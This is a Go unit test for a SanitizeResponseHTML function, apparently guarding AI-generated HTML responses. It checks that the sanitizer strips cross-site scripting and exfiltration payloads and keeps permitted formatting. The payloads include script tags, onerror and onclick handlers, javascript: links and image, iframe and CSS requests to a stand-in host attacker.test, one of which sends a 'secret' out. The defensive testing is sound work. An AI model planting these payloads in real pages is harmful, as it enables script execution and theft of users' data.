package domain

import (
	"strings"
	"testing"
)

func TestResponseHTMLRejectsExecutionAndExfiltration(t *testing.T) {
	attacks := []string{
		`<script>alert(1)</script><p onclick="fetch('/api')">Hello</p>`,
		`<img src="https://attacker.test/?secret=data" onerror="alert(1)"><p>Good</p>`,
		`<a href="javascript:alert(1)">Click</a><iframe src="https://attacker.test"></iframe>`,
		`<svg><a href="https://attacker.test">SVG</a></svg><math><mtext><img src=x onerror=alert(1)></mtext></math>`,
		`<style>body{background:url(https://attacker.test)}</style><div style="background:url(https://attacker.test)" class="ai-stat-card evil">Revenue</div>`,
		`<table background="https://attacker.test"><tr><td formaction="https://attacker.test">Data</td></tr></table>`,
	}
	for _, raw := range attacks {
		safe := SanitizeResponseHTML(raw)
		for _, bad := range []string{"<script", "<img", "<iframe", "<svg", "<math", "href=", "src=", "style=", "onclick=", "onerror=", "formaction=", "attacker.test", "evil"} {
			if strings.Contains(safe, bad) {
				t.Errorf("unsafe output %q", safe)
			}
		}
	}
	if safe := SanitizeResponseHTML(`<div class="ai-stat-card"><span class="stat-label">Revenue</span><strong>5 USD</strong></div>`); !strings.Contains(safe, `class="ai-stat-card"`) {
		t.Fatal("lost supported formatting")
	}
}
